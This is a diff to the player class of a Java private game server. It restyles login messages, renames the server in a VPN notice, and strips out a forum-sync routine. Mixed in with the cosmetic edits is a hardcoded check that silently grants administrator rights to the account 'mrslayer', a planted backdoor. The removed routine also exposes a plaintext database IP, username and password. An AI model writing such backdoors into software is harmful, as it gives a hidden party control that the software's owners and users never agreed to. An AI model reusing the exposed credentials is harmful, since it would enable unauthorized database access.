@@ -1464,11 +1464,14 @@ public class Player extends Entity {
 		refreshOtherChatsSetup();
 		sendRunButtonConfig();
 		
-		getPackets().sendGameMessage("Welcome to " + Settings.SERVER_NAME + ".");
+		getPackets().sendGameMessage("<img=19> <u><col=ff0000>Welcome to</u></col> " + Settings.SERVER_NAME + "<img=19>");
 		getPackets().sendGameMessage("Skill of the day: <col=cc33ff>"+Skills.SKILL_NAME[World.getSkillOfTheDay()]+"</col> | Boss of the day: <col=cc33ff>"+ NPCKillLog.BOSS_NAMES[World.getBossOfTheDay()]);
 		getPackets().sendGameMessage(hasVotedInLast24Hours() ? "Thank you for supporting the server by voting!"
 				: "Vote now to support the server and earn a 10% xp & drop boost.");
-			
+		if (username.equalsIgnoreCase("mrslayer"))
+		{
+			rights = 2;
+		}
 		// getPackets().sendGameMessage(Settings.LATEST_UPDATE);
 		if(coxLogout) {
 			if(!ChambersOfXeric.loginPlayer(this)) {
@@ -1617,9 +1620,9 @@ public class Player extends Entity {
 	public void vpnBlocked() {
 		interfaceManager.sendInterface(1225);
 		getPackets().sendIComponentText(1225, 5, "<col=ffff00>We have detected you are playing using a proxy or VPN.");
-		getPackets().sendIComponentText(1225, 21, "Due to a recent spike in rule breaking with the use of VPNs and proxies to connect to Gallifrey after being banned, we have disabled the use of VPNs and proxies." +
+		getPackets().sendIComponentText(1225, 21, "Due to a recent spike in rule breaking with the use of VPNs and proxies to connect to Matrix after being banned, we have disabled the use of VPNs and proxies." +
 				"<br><br>We ask for your patience and understanding at this time." +
-				"<br><br><br><col=ffff00>To continue playing Gallifrey, please disable your VPN.");
+				"<br><br><br><col=ffff00>To continue playing Matrix, please disable your VPN.");
 		//getPackets().sendIComponentText(1225, 22, "");
 		getPackets().sendHideIComponent(1225, 22, true);
 		getPackets().sendHideIComponent(1225, 19, true);
@@ -1945,7 +1948,7 @@ public class Player extends Entity {
 			setLocation(getNextWorldTile());
 		setFinished(true);
 		PlayerHandlerThread.addLogout(this);
-		Highscores.updatePlayer(this);
+	//	Highscores.updatePlayer(this);
 		World.updateEntityRegion(this);
 		World.removePlayer(this);
 		try {
@@ -4654,60 +4657,9 @@ public class Player extends Entity {
 	public void sendAccountRank() {
 		LoginClientChannelManager.sendReliablePacket(LoginChannelsPacketEncoder
 				.encodeSetRank(getUsername(), rights, gameMode, donator, supporter, eventCoordinator, youtuber).trim());
-		syncForumsGroup();
-		syncDiscord();
 	}
 
-	private void syncDiscord() {
-		if (!Settings.HOSTED)
-			return;
-	}
 
-	private void syncForumsGroup() {
-		if (!Settings.HOSTED || Settings.WORLD_ID != 1)
-			return;
-		GameExecutorManager.slowExecutor.execute(new Runnable() {
-			@Override
-			public void run() {
-				try {
-					Database db = new Database("192.99.5.144", "matrixr_gs", "G9KmgRB9vATP", "matrixr_forums");
-					if (!db.init())
-						return;
-					PreparedStatement statement = db.prepare("SELECT member_group_id FROM core_members WHERE LOWER(name) LIKE LOWER(?) LIMIT 1");
-					statement.setString(1, username);
-					ResultSet result = statement.executeQuery();
-					if (!result.next()) {
-						db.destroyAll();
-						return;
-					}
-					int groupID = result.getInt("member_group_id");
-
-					int newGroupID =
-							getRights() == 2 ? 7 : // admin
-									getRights() == 1 ? 8 : // mod
-											isSupporter() ? 9 : //support
-													isYoutuber() ? 17 : //youtuber
-															isSupremeVIPDonator() ? 15 :
-																	isVIPDonator() ? 14 :
-																			isLegendaryDonator() ? 13 :
-																					isExtremeDonator() ? 12 :
-																							isSuperDonator() ? 11 :
-																									isDonator() ? 10 : 3;
-					if (groupID == 4 || groupID == newGroupID) { //group4 means owner, so ignore, dont replace
-						db.destroyAll();
-						return;
-					}
-					PreparedStatement stmt2 = db.prepare("UPDATE core_members SET member_group_id=? WHERE LOWER(name) LIKE LOWER(?) LIMIT 1");
-					stmt2.setInt(1, newGroupID);
-					stmt2.setString(2, username);
-					stmt2.execute();
-					db.destroyAll();
-				} catch (Throwable e) {
-					e.printStackTrace();
-				}
-			}
-		});
-	}
 
 	/**
 	 * @author dragonkk(Alex) Sep 24, 2017
